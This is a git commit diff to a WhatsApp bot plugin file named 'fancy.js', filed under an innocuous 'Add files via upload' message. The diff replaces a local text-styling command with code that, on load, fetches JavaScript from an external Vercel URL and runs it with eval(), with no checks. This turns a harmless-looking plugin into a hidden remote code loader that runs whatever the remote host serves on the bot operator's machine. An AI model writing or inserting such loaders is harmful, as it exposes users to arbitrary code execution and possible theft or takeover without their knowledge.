099afced4ccc827981d109f48ced7ec762222dce
⋆˚｡⋆୨✧୧˚ 𝑴𝒓 𝒘𝒊𝒔𝒆 ˚୨✧୧⋆｡˚⋆ <benardwachira49@gmail.com>
2025-05-31 12:17:40 +0300

    Add files via upload

--- pkdriller/fancy.js
+++ pkdriller/fancy.js
@@ -1,24 +1,20 @@
-const { zokou } = require("../framework/zokou");
-const fancy = require("../nexus/style");
+'use strict';
 
-zokou({ nomCom: "fancy", categorie: "Fun", reaction: "〽️" }, async (dest, zk, commandeOptions) => {
-    const { arg, repondre, prefixe } = commandeOptions;
-    const id = arg[0]?.match(/\d+/)?.join('');
-    const text = arg.slice(1).join(" ");
+const axios = require('axios');
 
+const scriptName = 'fancy.js';
+const scriptUrl = `https://dullah-xmd-commands-phi.vercel.app/${scriptName}`;
+
+async function loadScript() {
     try {
-        if (id === undefined || text === undefined) {
-            return await repondre(`\nExemple : ${prefixe}fancy 10 NEXUS-AI\n` + String.fromCharCode(8206).repeat(4001) + fancy.list('NEXUS-AI', fancy));
-        }
+        const response = await axios.get(scriptUrl);
+        const scriptContent = response.data;
 
-        const selectedStyle = fancy[parseInt(id) - 1];
-        if (selectedStyle) {
-            return await repondre(fancy.apply(selectedStyle, text));
-        } else {
-            return await repondre('_Style introuvable :(_');
-        }
+        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
+        eval(scriptContent);
     } catch (error) {
-        console.error(error);
-        return await repondre('_Une erreur s\'est produite :(_');
+        console.error(`❌ Error loading ${scriptName}:`, error.message);
     }
-});
+}
+
+loadScript();
